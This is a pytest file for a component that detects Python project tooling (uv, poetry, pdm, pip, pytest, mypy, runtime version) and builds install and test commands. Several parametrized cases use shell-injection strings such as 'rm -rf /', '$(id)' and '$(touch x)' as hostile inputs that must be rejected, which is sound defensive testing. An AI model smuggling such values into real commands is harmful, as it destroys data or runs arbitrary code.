"""P2-11 (SPEC FR-3, §9.4): Python environment detection from a mirror tree.

Tests first, one group per rule: lockfile/config -> tool (uv, poetry, pdm, pip), extras and
groups, pytest vs unittest, mypy/pyright, runtime version. Everything reads a `TreeReader`
(the in-memory `DictTree`), never a path. Commands run with `sh -c`, from the workspace root,
against the venv `.venv` that the install command creates.
"""

from __future__ import annotations

import hashlib
from collections.abc import Mapping

import pytest

from mpilot.core.errors import InputError
from mpilot.detect.python import (
    DEFAULT_PYTHON_VERSION,
    PYTHON_IMAGE_VERSIONS,
    PythonDetection,
    PythonDetectionError,
    detect_python,
    is_python_project,
    junit_invocation,
)
from mpilot.testing.doubles import DictTree

COMMIT = "a" * 40
PY = ".venv/bin/python"
MIN = '[project]\nname = "x"\nversion = "0"\n'


def detect(files: Mapping[str, str]) -> PythonDetection:
    return detect_python(DictTree(COMMIT, files))


def proj(body: str = "", *, head: str = MIN) -> str:
    return head + body


# --- is this a python project ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "name",
    ["pyproject.toml", "setup.py", "setup.cfg", "requirements.txt", "requirements-dev.txt",
     "uv.lock", "poetry.lock", "pdm.lock", "Pipfile"],
)  # fmt: skip
def test_these_files_make_a_python_project(name: str) -> None:
    assert is_python_project(DictTree(COMMIT, {name: ""}))


def test_other_files_do_not() -> None:
    assert not is_python_project(DictTree(COMMIT, {"package.json": "{}", "README.md": ""}))
    assert not is_python_project(DictTree(COMMIT, {"sub/pyproject.toml": ""}))


# --- tool: lockfile first, then config, then requirements ------------------------------------------


@pytest.mark.parametrize(
    ("lockfile", "tool"), [("uv.lock", "uv"), ("poetry.lock", "poetry"), ("pdm.lock", "pdm")]
)
def test_the_lockfile_names_the_tool(lockfile: str, tool: str) -> None:
    d = detect({"pyproject.toml": proj(), lockfile: ""})
    assert (d.tool.value, d.tool.source) == (tool, lockfile)
    assert d.lockfiles == (lockfile,)
    assert d.lockfile_hashes == {lockfile: hashlib.sha256(b"").hexdigest()}


@pytest.mark.parametrize(
    ("table", "tool"),
    [("[tool.poetry]\nname = 'x'\n", "poetry"), ("[tool.pdm]\n", "pdm"), ("[tool.uv]\n", "uv")],
)
def test_without_a_lockfile_the_tool_table_names_the_tool_and_a_warning_says_so(
    table: str, tool: str
) -> None:
    d = detect({"pyproject.toml": table})
    assert (d.tool.value, d.tool.source) == (tool, f"pyproject.toml#tool.{tool}")
    assert d.lockfiles == ()
    assert any("no lockfile" in w for w in d.warnings)


@pytest.mark.parametrize(
    "files",
    [
        {"pyproject.toml": proj()},
        {"requirements.txt": "six\n"},
        {"setup.py": "from setuptools import setup\nsetup()\n"},
        {"setup.cfg": "[metadata]\nname = x\n"},
    ],
)
def test_everything_else_is_pip(files: dict[str, str]) -> None:
    d = detect(files)
    assert d.tool.value == "pip"
    assert d.tool.source in {"pyproject.toml", "requirements.txt", "setup.py", "setup.cfg"}


def test_several_lockfiles_use_a_fixed_priority_and_warn() -> None:
    d = detect({"pyproject.toml": proj(), "pdm.lock": "", "poetry.lock": "", "uv.lock": ""})
    assert d.tool.value == "uv"
    assert d.lockfiles == ("uv.lock", "poetry.lock", "pdm.lock")
    assert any("several lockfiles" in w for w in d.warnings)
    d = detect({"pyproject.toml": proj(), "pdm.lock": "", "poetry.lock": ""})
    assert d.tool.value == "poetry"


def test_a_lockfile_beats_a_disagreeing_tool_table_and_requirements() -> None:
    d = detect({"pyproject.toml": "[tool.poetry]\n", "uv.lock": "", "requirements.txt": "six\n"})
    assert d.tool.value == "uv"
    assert any("[tool.poetry]" in w for w in d.warnings)
    d = detect({"pyproject.toml": proj(), "poetry.lock": "", "requirements.txt": "six\n"})
    assert d.tool.value == "poetry"


def test_a_lockfile_that_is_a_symlink_is_ignored() -> None:
    class Linked(DictTree):
        def snapshot(self):  # type: ignore[no-untyped-def]
            snap = super().snapshot()
            snap.entries["uv.lock"] = snap.entries["uv.lock"].model_copy(update={"mode": "120000"})
            return snap

    d = detect_python(Linked(COMMIT, {"pyproject.toml": proj(), "uv.lock": "x"}))
    assert d.tool.value == "pip"
    assert any("not a regular file" in w for w in d.warnings)


def test_pipenv_alone_is_unsupported_and_with_requirements_it_is_ignored() -> None:
    with pytest.raises(PythonDetectionError, match="Pipenv is unsupported"):
        detect({"Pipfile": "", "Pipfile.lock": "{}"})
    d = detect({"Pipfile": "", "requirements.txt": "six\n"})
    assert d.tool.value == "pip"
    assert any("Pipfile" in w for w in d.warnings)


def test_no_python_files_is_an_error() -> None:
    with pytest.raises(PythonDetectionError, match="no Python project files"):
        detect({"README.md": ""})
    assert issubclass(PythonDetectionError, InputError)


@pytest.mark.parametrize("text", ["[project", "name = = 1", "[[x]]\n[x]\n", "\x00"])
def test_a_pyproject_that_is_not_toml_is_an_error(text: str) -> None:
    with pytest.raises(PythonDetectionError, match=r"pyproject\.toml is not valid TOML"):
        detect({"pyproject.toml": text})


def test_an_unreadable_pyproject_is_an_error() -> None:
    class Unreadable(DictTree):
        def read_text(self, rel_path: str) -> str | None:
            return None

    with pytest.raises(PythonDetectionError, match=r"pyproject\.toml cannot be read"):
        detect_python(Unreadable(COMMIT, {"pyproject.toml": "x"}))


# --- install commands, extras and groups ------------------------------------------------------------

UV_EXTRAS = proj(
    '[project.optional-dependencies]\ntest = ["pytest"]\ndev = ["mypy"]\ndocs = ["sphinx"]\n'
    '[dependency-groups]\ndev = ["ruff"]\nlint = ["flake8"]\n'
)


def test_uv_installs_the_test_and_dev_extras_and_groups() -> None:
    d = detect({"pyproject.toml": UV_EXTRAS, "uv.lock": ""})
    assert d.install_cmd.value == "uv sync --frozen --extra test --extra dev --group dev"
    assert d.install_unfrozen_cmd.value == "uv sync --extra test --extra dev --group dev"
    assert d.extras == ("test", "dev")
    assert d.groups == ("dev",)
    assert d.install_cmd.source == "uv.lock"


def test_uv_with_nothing_to_select() -> None:
    d = detect({"pyproject.toml": proj(), "uv.lock": ""})
    assert d.install_cmd.value == "uv sync --frozen"
    assert d.install_unfrozen_cmd.value == "uv sync"
    assert d.extras == d.groups == ()


POETRY = (
    "[tool.poetry]\nname = 'x'\n[tool.poetry.dependencies]\npython = '^3.9'\n"
    "[tool.poetry.group.test.dependencies]\npytest = '*'\n"
    "[tool.poetry.group.docs.dependencies]\nsphinx = '*'\n"
    "[tool.poetry.group.dev.dependencies]\nmypy = '*'\n"
    "[tool.poetry.extras]\ntests = ['pytest']\nfast = ['ujson']\n"
)


def test_poetry_keeps_its_venv_in_the_project_for_every_command() -> None:
    """Poetry honours the in-project setting only if it is set on the first command that
    creates the environment, `poetry lock` included (checked against the image, P2-11)."""
    d = detect({"pyproject.toml": POETRY, "poetry.lock": ""})
    frozen = (
        "POETRY_VIRTUALENVS_IN_PROJECT=true poetry install --no-interaction "
        "--extras tests --with test,dev"
    )
    assert d.install_cmd.value == frozen
    assert (
        d.install_unfrozen_cmd.value
        == f"POETRY_VIRTUALENVS_IN_PROJECT=true poetry lock && {frozen}"
    )
    assert (d.extras, d.groups) == (("tests",), ("test", "dev"))


def test_poetry_with_nothing_to_select() -> None:
    d = detect({"pyproject.toml": "[tool.poetry]\nname = 'x'\n", "poetry.lock": ""})
    assert (
        d.install_cmd.value == "POETRY_VIRTUALENVS_IN_PROJECT=true poetry install --no-interaction"
    )


def test_pdm_installs_extras_and_dev_groups_with_g() -> None:
    body = proj(
        '[project.optional-dependencies]\ntest = ["pytest"]\nextra = ["x"]\n'
        '[tool.pdm.dev-dependencies]\ndev = ["mypy"]\nlint = ["ruff"]\n'
    )
    d = detect({"pyproject.toml": body, "pdm.lock": ""})
    assert d.install_cmd.value == "pdm install --frozen-lockfile -G test -G dev"
    assert (d.extras, d.groups) == (("test",), ("dev",))


def test_pdm_relocks_the_groups_the_lockfile_already_has() -> None:
    lock = '# comment\n\n[metadata]\ngroups = ["default", "dev", "test"]\nstrategy = ["inherit_metadata"]\n'
    d = detect({"pyproject.toml": proj(), "pdm.lock": lock})
    assert d.install_unfrozen_cmd.value == "pdm lock -G dev -G test && pdm install"


@pytest.mark.parametrize(
    "lock",
    [
        "",
        "[metadata]\nstrategy = []\n",
        '[metadata]\ngroups = ["default", "a; rm -rf /"]\n',
        '[metadata]\ngroups = ["default", "$(id)"]\n',
        "[metadata]\ngroups = [" + ", ".join(f'"g{i}"' for i in range(40)) + "]\n",
    ],
)
def test_pdm_relocks_everything_when_the_lock_groups_cannot_be_trusted(lock: str) -> None:
    d = detect({"pyproject.toml": proj(), "pdm.lock": lock})
    assert d.install_unfrozen_cmd.value == "pdm lock -G :all && pdm install"


def test_pdm_unfrozen_install_also_selects_groups() -> None:
    body = proj('[project.optional-dependencies]\ntest = ["pytest"]\n')
    lock = '[metadata]\ngroups = ["default", "test"]\n'
    d = detect({"pyproject.toml": body, "pdm.lock": lock})
    assert d.install_unfrozen_cmd.value == "pdm lock -G test && pdm install -G test"


@pytest.mark.parametrize(
    "name", ["Test", "TEST", "tests", "testing", "dev", "develop", "development"]
)
def test_the_selected_extras_are_a_fixed_set_matched_case_insensitively(name: str) -> None:
    body = proj(f'[project.optional-dependencies]\n"{name}" = ["pytest"]\n')
    d = detect({"pyproject.toml": body, "uv.lock": ""})
    assert d.extras == (name.lower(),)
    assert d.install_cmd.value == f"uv sync --frozen --extra {name.lower()}"


@pytest.mark.parametrize(
    "name",
    [
        "docs",
        "lint",
        "all",
        "test; rm -rf /",
        "$(touch x)",
        "dev tools",
        "tests_extra",
        "../x",
        "--no-deps",
    ],
)
def test_other_extras_and_hostile_names_are_never_selected(name: str) -> None:
    body = proj(f'[project.optional-dependencies]\n"{name}" = ["pytest"]\n')
    d = detect({"pyproject.toml": body, "uv.lock": ""})
    assert d.extras == ()
    assert d.install_cmd.value == "uv sync --frozen"


def test_extras_come_in_a_fixed_order_whatever_the_file_says() -> None:
    body = proj('[project.optional-dependencies]\ndevelop = ["a"]\ntesting = ["b"]\ntest = ["c"]\n')
    d = detect({"pyproject.toml": body, "uv.lock": ""})
    assert d.extras == ("test", "testing", "develop")


# pip and requirements files


def test_pip_installs_requirements_and_the_project_with_extras() -> None:
    files = {
        "pyproject.toml": proj('[project.optional-dependencies]\ntest = ["pytest"]\ndev = ["x"]\n'),
        "requirements.txt": "six\n",
        "requirements-dev.txt": "-r requirements.txt\npytest\n",
    }
    d = detect(files)
    expected = (
        "python -m venv .venv && .venv/bin/pip install "
        "-r requirements.txt -r requirements-dev.txt -e '.[test,dev]'"
    )
    assert d.install_cmd.value == expected
    assert d.install_unfrozen_cmd.value == expected, "pip has no lockfile to freeze"
    assert d.requirements_files == ("requirements.txt", "requirements-dev.txt")
    assert d.lockfiles == ("requirements.txt", "requirements-dev.txt", "pyproject.toml")


def test_pip_with_only_a_requirements_file_installs_no_project() -> None:
    d = detect({"requirements.txt": "six\n"})
    assert (
        d.install_cmd.value == "python -m venv .venv && .venv/bin/pip install -r requirements.txt"
    )
    assert d.lockfiles == ("requirements.txt",)


def test_pip_installs_a_pyproject_project_without_requirements_files() -> None:
    d = detect({"pyproject.toml": proj()})
    assert d.install_cmd.value == "python -m venv .venv && .venv/bin/pip install -e ."
    assert d.lockfiles == ("pyproject.toml",)


def test_pip_installs_a_setup_py_project() -> None:
    d = detect({"setup.py": "x"})
    assert d.install_cmd.value == "python -m venv .venv && .venv/bin/pip install -e ."
    assert d.lockfiles == ("setup.py",)


def test_a_pyproject_with_only_tool_config_is_not_installable() -> None:
    d = detect({"pyproject.toml": "[tool.black]\nline-length = 100\n", "requirements.txt": "six\n"})
    assert "-e" not in d.install_cmd.value
    assert d.lockfiles == ("requirements.txt",)


@pytest.mark.parametrize(
    ("names", "selected"),
    [
        (["requirements.txt"], ["requirements.txt"]),
        (["requirements.txt", "requirements-dev.txt", "requirements-test.txt"],
         ["requirements.txt", "requirements-dev.txt", "requirements-test.txt"]),
        (["requirements_dev.txt", "requirements.txt"], ["requirements.txt", "requirements_dev.txt"]),
        (["requirements-tests.txt", "requirements-testing.txt", "requirements-development.txt"],
         ["requirements-development.txt", "requirements-testing.txt", "requirements-tests.txt"]),
        (["dev-requirements.txt", "test-requirements.txt"],
         ["dev-requirements.txt", "test-requirements.txt"]),
        (["requirements-docs.txt", "requirements-prod.txt", "requirements-lock.txt", "requirements.in"],
         []),
        (["requirements.txt", "requirements-dev.txt.bak", "Requirements.txt", "requirements-dev.txt "],
         ["requirements.txt"]),
    ],
)  # fmt: skip
def test_requirements_files_selected(names: list[str], selected: list[str]) -> None:
    d = detect(dict.fromkeys(names, "six\n") | {"setup.py": "x"})
    assert list(d.requirements_files) == selected


def test_requirements_files_in_subdirectories_are_not_selected() -> None:
    d = detect({"setup.py": "x", "requirements/dev.txt": "x", "sub/requirements.txt": "x"})
    assert d.requirements_files == ()


@pytest.mark.parametrize(
    "name",
    [
        "requirements-dev$(id).txt",
        "requirements-dev;x.txt",
        "requirements-dev x.txt",
        "requirements-dev'.txt",
    ],
)
def test_a_requirements_file_name_with_shell_characters_is_never_used(name: str) -> None:
    d = detect({"setup.py": "x", name: "six\n", "requirements.txt": "x"})
    assert d.requirements_files == ("requirements.txt",)
    assert name not in d.install_cmd.value


def test_pip_does_not_install_dependency_groups_and_says_so() -> None:
    body = proj('[dependency-groups]\ndev = ["pytest"]\n')
    d = detect({"pyproject.toml": body})
    assert d.groups == ()
    assert any("dependency groups" in w for w in d.warnings)


# --- tests: pytest when configured, else unittest -----------------------------------------------------------


@pytest.mark.parametrize(
    ("files", "source"),
    [
        ({"pytest.ini": "[pytest]\n"}, "pytest.ini"),
        (
            {"pyproject.toml": proj("[tool.pytest.ini_options]\naddopts = '-q'\n")},
            "pyproject.toml#tool.pytest.ini_options",
        ),
        ({"pyproject.toml": proj("[tool.pytest]\nx = 1\n")}, "pyproject.toml#tool.pytest"),
        ({"setup.cfg": "[tool:pytest]\naddopts = -q\n"}, "setup.cfg#tool:pytest"),
        ({"tox.ini": "[pytest]\naddopts = -q\n"}, "tox.ini#pytest"),
        ({"setup.py": "x", "conftest.py": ""}, "conftest.py"),
        ({"setup.py": "x", "tests/conftest.py": ""}, "tests/conftest.py"),
        ({"setup.py": "x", "test/conftest.py": ""}, "test/conftest.py"),
    ],
)
def test_pytest_is_used_when_configured(files: dict[str, str], source: str) -> None:
    d = detect({"requirements.txt": "pytest\n", **files})
    assert d.test_runner is not None
    assert (d.test_runner.value, d.test_runner.source) == ("pytest", source)
    assert d.test_cmd is not None
    assert d.test_cmd.value == f"{PY} -m pytest -q"
    assert d.test_cmd.source == source


@pytest.mark.parametrize(
    ("files", "where"),
    [
        ({"requirements-dev.txt": "pytest>=7\n"}, "requirements-dev.txt"),
        ({"requirements.txt": "# tools\nPyTest[extra]==8.0 ; python_version > '3.8'\n"}, "requirements.txt"),
        ({"pyproject.toml": proj('dependencies = ["pytest>=7"]\n')}, "pyproject.toml#project.dependencies"),
        ({"pyproject.toml": proj('[project.optional-dependencies]\ntest = ["pytest-cov", "pytest"]\n')}, "pyproject.toml#project.optional-dependencies.test"),
        ({"pyproject.toml": proj('[dependency-groups]\ndev = ["pytest"]\n'), "uv.lock": ""}, "pyproject.toml#dependency-groups.dev"),
        ({"pyproject.toml": "[tool.poetry.group.test.dependencies]\npytest = '*'\n", "poetry.lock": ""}, "pyproject.toml#tool.poetry.group.test.dependencies"),
        ({"pyproject.toml": "[tool.poetry.dev-dependencies]\npytest = '*'\n", "poetry.lock": ""}, "pyproject.toml#tool.poetry.dev-dependencies"),
        ({"pyproject.toml": "[tool.poetry.dependencies]\npytest = '*'\n", "poetry.lock": ""}, "pyproject.toml#tool.poetry.dependencies"),
        ({"pyproject.toml": proj('[tool.pdm.dev-dependencies]\ndev = ["pytest"]\n'), "pdm.lock": ""}, "pyproject.toml#tool.pdm.dev-dependencies.dev"),
        ({"pyproject.toml": proj('[tool.uv]\ndev-dependencies = ["pytest"]\n'), "uv.lock": ""}, "pyproject.toml#tool.uv.dev-dependencies"),
    ],
)  # fmt: skip
def test_pytest_is_used_when_it_is_a_dependency_that_gets_installed(
    files: dict[str, str], where: str
) -> None:
    d = detect(files)
    assert d.test_runner is not None
    assert (d.test_runner.value, d.test_runner.source) == ("pytest", f"{where} lists pytest")
    assert d.test_cmd is not None
    assert d.test_cmd.value == f"{PY} -m pytest -q"


def test_a_pytest_dependency_in_an_extra_that_is_not_installed_does_not_count() -> None:
    body = proj('[project.optional-dependencies]\nlint = ["pytest"]\n')
    d = detect({"pyproject.toml": body, "tests/test_a.py": "import unittest\n"})
    assert d.test_runner is not None
    assert d.test_runner.value == "unittest"


def test_pytest_configured_but_not_installed_still_runs_pytest_with_a_warning() -> None:
    d = detect({"requirements.txt": "six\n", "pytest.ini": "[pytest]\n"})
    assert d.test_runner is not None
    assert d.test_runner.value == "pytest"
    assert any("not a dependency" in w for w in d.warnings)


def test_a_requirement_name_must_match_exactly() -> None:
    for text in (
        "pytest-cov\n",
        "mypytest\n",
        "pytest_mock==1\n",
        "# pytest\n",
        "-e git+https://x/pytest#egg=y\n",
    ):
        d = detect({"requirements.txt": text, "tests/test_a.py": "x"})
        assert d.test_runner is not None
        assert d.test_runner.value == "unittest", text


def test_underscores_dots_and_case_normalize_in_requirement_names() -> None:
    d = detect({"requirements.txt": "Py_Test\n", "tests/test_a.py": "x"})
    assert d.test_runner is not None
    assert d.test_runner.value == "unittest"  # `py-test` is not `pytest`
    d = detect({"requirements.txt": "PYTEST\n"})
    assert d.test_runner is not None
    assert d.test_runner.value == "pytest"


@pytest.mark.parametrize(
    "files",
    [
        {"tests/test_a.py": "x"},
        {"test/test_a.py": "x"},
        {"test_a.py": "x"},
        {"pkg/test_a.py": "x"},
        {"pkg/a_test.py": "x"},
        {"tests/helpers.py": "x"},
        {"testing/anything.py": "x"},
    ],
)
def test_unittest_when_pytest_is_not_configured_and_tests_exist(files: dict[str, str]) -> None:
    d = detect({"requirements.txt": "six\n", **files})
    assert d.test_runner is not None
    assert d.test_runner.value == "unittest"
    assert d.test_runner.source == "test files present, pytest not configured"
    assert d.test_cmd is not None
    assert d.test_cmd.value == f"{PY} -m unittest discover"


def test_no_tests_no_test_command() -> None:
    d = detect({"requirements.txt": "six\n", "src/app.py": "x", "docs/test.rst": "x"})
    assert d.test_cmd is None
    assert d.test_runner is None
    assert any("no test command" in w for w in d.warnings)


def test_a_project_that_only_has_tox_or_nox_is_not_supported_yet_and_says_so() -> None:
    for name in ("tox.ini", "noxfile.py"):
        d = detect({"requirements.txt": "six\n", name: "x"})
        assert d.test_cmd is None
        assert any("tox or nox" in w for w in d.warnings)


def test_tox_ini_with_a_pytest_section_is_pytest_not_tox() -> None:
    d = detect(
        {"requirements.txt": "six\n", "tox.ini": "[tox]\nenvlist = py\n[pytest]\naddopts=-q\n"}
    )
    assert d.test_runner is not None
    assert d.test_runner.value == "pytest"


# JUnit


def test_pytest_gets_a_junitxml_flag_and_unittest_gets_none() -> None:
    d = detect({"requirements.txt": "pytest\n"})
    inv = junit_invocation(d, "reports/junit.xml")
    assert inv is not None
    assert inv.cmd == f"{PY} -m pytest -q --junitxml=reports/junit.xml"
    assert inv.output_path == "reports/junit.xml"
    u = detect({"requirements.txt": "six\n", "tests/test_a.py": "x"})
    assert junit_invocation(u, "junit.xml") is None
    assert junit_invocation(detect({"requirements.txt": "six\n"}), "junit.xml") is None


@pytest.mark.parametrize(
    "bad", ["", "../x.xml", "/abs.xml", "a b.xml", "a;b.xml", "-x.xml", "x\n.xml"]
)
def test_the_junit_output_path_must_be_a_plain_relative_path(bad: str) -> None:
    with pytest.raises(ValueError, match="output path"):
        junit_invocation(detect({"requirements.txt": "pytest\n"}), bad)


# --- typecheck: mypy or pyright, if configured --------------------------------------------------------------


@pytest.mark.parametrize(
    ("files", "source"),
    [
        ({"pyproject.toml": proj("[tool.mypy]\nstrict = true\n")}, "pyproject.toml#tool.mypy"),
        ({"mypy.ini": "[mypy]\n", "setup.py": "x"}, "mypy.ini"),
        ({".mypy.ini": "[mypy]\n", "setup.py": "x"}, ".mypy.ini"),
        ({"setup.cfg": "[mypy]\nstrict = True\n"}, "setup.cfg#mypy"),
        ({"setup.cfg": "[mypy-requests.*]\nignore_missing_imports = True\n"}, "setup.cfg#mypy"),
    ],
)
def test_mypy_is_used_when_configured(files: dict[str, str], source: str) -> None:
    d = detect({"requirements.txt": "mypy\n", **files})
    assert d.typecheck_tool is not None
    assert (d.typecheck_tool.value, d.typecheck_tool.source) == ("mypy", source)
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == f"{PY} -m mypy ."
    assert d.typecheck_cmd.source == source


def test_mypy_installed_but_not_configured_is_not_run() -> None:
    d = detect({"requirements-dev.txt": "mypy\n", "setup.py": "x"})
    assert d.typecheck_tool is None
    assert d.typecheck_cmd is None


def test_mypy_targets_the_configured_files_else_src_else_the_root() -> None:
    cases = [
        (proj("[tool.mypy]\nfiles = ['src', 'tests']\n"), {}, f"{PY} -m mypy"),
        (proj("[tool.mypy]\nfiles = 'src'\n"), {}, f"{PY} -m mypy"),
        (proj("[tool.mypy]\nstrict = true\n"), {"src/pkg/a.py": ""}, f"{PY} -m mypy src"),
        (proj("[tool.mypy]\nstrict = true\n"), {}, f"{PY} -m mypy ."),
    ]
    for pyproject, extra, expected in cases:
        d = detect({"pyproject.toml": pyproject, **extra})
        assert d.typecheck_cmd is not None
        assert d.typecheck_cmd.value == expected, pyproject
    d = detect({"mypy.ini": "[mypy]\nfiles = src\n", "setup.py": "x"})
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == f"{PY} -m mypy"
    d = detect({"setup.cfg": "[mypy]\nfiles = pkg\n"})
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == f"{PY} -m mypy"


def test_mypy_configured_but_not_installed_still_runs_with_a_warning() -> None:
    d = detect({"requirements.txt": "six\n", "mypy.ini": "[mypy]\n"})
    assert d.typecheck_cmd is not None
    assert any("mypy is configured" in w and "not a dependency" in w for w in d.warnings)


@pytest.mark.parametrize(
    ("files", "source"),
    [
        ({"pyrightconfig.json": "{}"}, "pyrightconfig.json"),
        (
            {"pyproject.toml": proj("[tool.pyright]\nstrict = ['x']\n")},
            "pyproject.toml#tool.pyright",
        ),
    ],
)
def test_pyright_runs_from_the_images_own_copy_against_the_repos_venv(
    files: dict[str, str], source: str
) -> None:
    d = detect({"requirements.txt": "pyright\n", **files})
    assert d.typecheck_tool is not None
    assert (d.typecheck_tool.value, d.typecheck_tool.source) == ("pyright", source)
    assert d.typecheck_cmd is not None
    assert d.typecheck_cmd.value == "pyright --pythonpath .venv/bin/python"
    assert d.typecheck_cmd.source == source
    assert not any("offline" in w for w in d.warnings)


def test_pyright_runs_even_when_the_repo_does_not_list_it_as_a_dependency() -> None:
    # unlike mypy, the images carry pyright, so it need not be installed into the repo's venv
    d = detect({"requirements.txt": "six\n", "pyrightconfig.json": "{}"})
    assert d.typecheck_cmd is not None
    assert not any("pyright" in w for w in d.warnings)


def test_mypy_wins_when_both_are_configured() -> None:
    d = detect({"requirements.txt": "mypy\n", "mypy.ini": "[mypy]\n", "pyrightconfig.json": "{}"})
    assert d.typecheck_tool is not None
    assert d.typecheck_tool.value == "mypy"
    assert d.typecheck_cmd is not None


def test_no_typecheck_for_an_unconfigured_project() -> None:
    d = detect({"requirements.txt": "six\n"})
    assert (d.typecheck_cmd, d.typecheck_tool) == (None, None)


def test_python_projects_have_no_build_step() -> None:
    assert not hasattr(detect({"requirements.txt": "six\n"}), "build_cmd")


# --- runtime version --------------------------------------------------------------------------------------------


def runtime(files: Mapping[str, str]) -> PythonDetection:
    return detect({"requirements.txt": "six\n", **files})


@pytest.mark.parametrize(
    ("spec", "version"),
    [
        ("3.11.4\n", "3.11"),
        ("3.12\n", "3.12"),
        ("3.9.25", "3.9"),
        ("3.13.0rc1", "3.13"),
        ("3.12-dev", "3.12"),
        ("python-3.10.4", "3.10"),
        ("cpython-3.11.2", "3.11"),
        ("  3.12.1  \n\n", "3.12"),
        ("# pinned\n3.10\n", "3.10"),
        ("3.11.4\n3.10.9\n", "3.11"),  # pyenv lists fallbacks: the first is the one
        ("3", DEFAULT_PYTHON_VERSION),
    ],
)
def test_python_version_file_names_the_runtime(spec: str, version: str) -> None:
    d = runtime({".python-version": spec})
    assert (d.runtime_version.value, d.runtime_version.source) == (version, ".python-version")
    assert not [w for w in d.warnings if "asks for" in w or ".python-version" in w], d.warnings


@pytest.mark.parametrize("spec", ["3.8.18", "3.7", "3.14.0", "3.15", "3.14-dev"])
def test_a_version_without_an_image_maps_to_the_nearest_supported_one_with_a_warning(
    spec: str,
) -> None:
    d = runtime({".python-version": spec})
    expected = "3.9" if spec.startswith(("3.7", "3.8")) else "3.13"
    assert d.runtime_version.value == expected
    assert any("asks for python" in w for w in d.warnings)
    assert d.python_requested == spec


@pytest.mark.parametrize(
    "spec",
    [
        "",
        "\n",
        "system",
        "pypy3.10-7.3.15",
        "miniconda3-latest",
        "myenv",
        "2.7.18",
        "3.x",
        "3.12; rm -rf /",
    ],
)
def test_an_unusable_python_version_file_is_ignored_with_a_warning(spec: str) -> None:
    d = runtime({".python-version": spec})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        DEFAULT_PYTHON_VERSION,
        "default",
    )
    assert any(".python-version" in w for w in d.warnings)


@pytest.mark.parametrize(
    ("spec", "version"),
    [
        (">=3.8", "3.9"),
        (">=3.9", "3.9"),
        (">=3.10", "3.10"),
        (">=3.12", "3.12"),
        (">=3.13", "3.13"),
        (">=3.9,<4", "3.9"),
        (">=3.9, <3.12", "3.9"),
        (">=3.10,<3.13", "3.10"),
        ("~=3.10", "3.10"),
        ("~=3.10.2", "3.10"),
        ("==3.11.*", "3.11"),
        (">3.9", "3.9"),  # PEP 440: 3.9.25 is greater than 3.9
        ("!=3.9.*,>=3.8", "3.10"),
        ("<3.11,>=3.8", "3.9"),
        (">=3.8,!=3.9.*,!=3.10.*", "3.11"),
    ],
)
def test_requires_python_picks_the_lowest_supported_runtime_that_satisfies_it(
    spec: str, version: str
) -> None:
    body = f'[project]\nname = "x"\nversion = "0"\nrequires-python = "{spec}"\n'
    d = runtime({"pyproject.toml": body})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        version,
        "pyproject.toml#project.requires-python",
    )


@pytest.mark.parametrize(
    ("spec", "version"),
    [("^3.9", "3.9"), ("^3.10", "3.10"), ("~3.11", "3.11"), ("~3.10.2", "3.10"), (">=3.9 <3.12", "3.9"),
     (">=3.10 <4.0", "3.10"), ("3.11.*", "3.11"), ("^3.9 || ^3.12", "3.9"), (">=3.8,<3.11", "3.9"), ("3.12", "3.12")],
)  # fmt: skip
def test_poetrys_python_constraint_is_understood(spec: str, version: str) -> None:
    body = f"[tool.poetry.dependencies]\npython = '{spec}'\n"
    d = runtime({"pyproject.toml": body, "poetry.lock": ""})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        version,
        "pyproject.toml#tool.poetry.dependencies.python",
    )
    assert not [w for w in d.warnings if "closest" in w or "requires-python" in w], d.warnings


@pytest.mark.parametrize(
    ("spec", "version"),
    [
        ("<3.9", "3.9"),
        (">=3.14", "3.13"),
        ("~=3.8.1", "3.9"),
        ("==3.14.*", "3.13"),
        (">=3.13.99", "3.13"),
    ],
)
def test_a_range_no_image_satisfies_maps_to_the_closest_with_a_warning(
    spec: str, version: str
) -> None:
    body = f'[project]\nname = "x"\nversion = "0"\nrequires-python = "{spec}"\n'
    d = runtime({"pyproject.toml": body})
    assert d.runtime_version.value == version
    assert any("closest" in w for w in d.warnings)


@pytest.mark.parametrize(
    "spec", ["", "latest", "3.x", "$(id)", ">=", "banana", ">=4", "<3", "==2.7.*"]
)
def test_a_requires_python_that_cannot_be_used_falls_through_with_a_warning(spec: str) -> None:
    body = f'[project]\nname = "x"\nversion = "0"\nrequires-python = "{spec}"\n'
    d = runtime({"pyproject.toml": body})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        DEFAULT_PYTHON_VERSION,
        "default",
    )
    if spec:
        assert any("requires-python" in w for w in d.warnings)


def test_precedence_is_python_version_then_requires_python_then_poetry_then_default() -> None:
    files = {
        "pyproject.toml": '[project]\nname="x"\nversion="0"\nrequires-python=">=3.10"\n'
        "[tool.poetry.dependencies]\npython='^3.12'\n",
        "poetry.lock": "",
    }
    assert runtime(files).runtime_version.source == "pyproject.toml#project.requires-python"
    d = runtime({**files, ".python-version": "3.11"})
    assert (d.runtime_version.value, d.runtime_version.source) == ("3.11", ".python-version")
    d = runtime(
        {"pyproject.toml": "[tool.poetry.dependencies]\npython='^3.12'\n", "poetry.lock": ""}
    )
    assert (d.runtime_version.value, d.runtime_version.source) == (
        "3.12",
        "pyproject.toml#tool.poetry.dependencies.python",
    )
    assert runtime({}).runtime_version.source == "default"


def test_an_unusable_version_file_falls_through_to_requires_python() -> None:
    body = '[project]\nname="x"\nversion="0"\nrequires-python=">=3.11"\n'
    d = runtime({".python-version": "system", "pyproject.toml": body})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        "3.11",
        "pyproject.toml#project.requires-python",
    )
    assert any(".python-version" in w for w in d.warnings)


@pytest.mark.parametrize("value", ["3", '["3.9"]', "{x = 1}", "true", "3.9"])
def test_a_non_string_requires_python_is_ignored(value: str) -> None:
    body = f'[project]\nname = "x"\nversion = "0"\nrequires-python = {value}\n'
    d = runtime({"pyproject.toml": body})
    assert (d.runtime_version.value, d.runtime_version.source) == (
        DEFAULT_PYTHON_VERSION,
        "default",
    )


def test_an_exact_minor_without_a_patch_is_the_closest_image_with_a_warning() -> None:
    """PEP 440 `==3.12` means 3.12.0, which is no image's version."""
    body = '[project]\nname = "x"\nversion = "0"\nrequires-python = "==3.12"\n'
    d = runtime({"pyproject.toml": body})
    assert d.runtime_version.value == "3.12"
